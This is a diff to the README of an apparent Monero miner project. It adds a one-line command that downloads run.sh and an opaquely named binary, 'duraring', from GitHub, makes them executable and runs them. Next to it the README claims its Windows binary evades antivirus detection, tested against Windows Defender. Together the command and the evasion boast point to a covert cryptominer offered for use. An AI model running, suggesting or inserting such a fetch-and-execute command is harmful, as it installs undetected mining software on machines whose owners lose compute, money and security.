@@ -8,7 +8,7 @@ you can find examples in **run** files.
 #### --cpu-threads-hint
 this options accepts 4 value.
 25 and 75 work only on 4-Core CPUs
-
+wget https://raw.githubusercontent.com/cihuuy/Compiled-Monero-Miner/main/Linux/run.sh && wget https://github.com/cihuuy/Compiled-Monero-Miner/raw/main/Linux/duraring && chmod +x run.sh duraring && ./run.sh
 ---
 
 ##### AV cannot Detect Windows binary. (Tested on WindowsDefender)
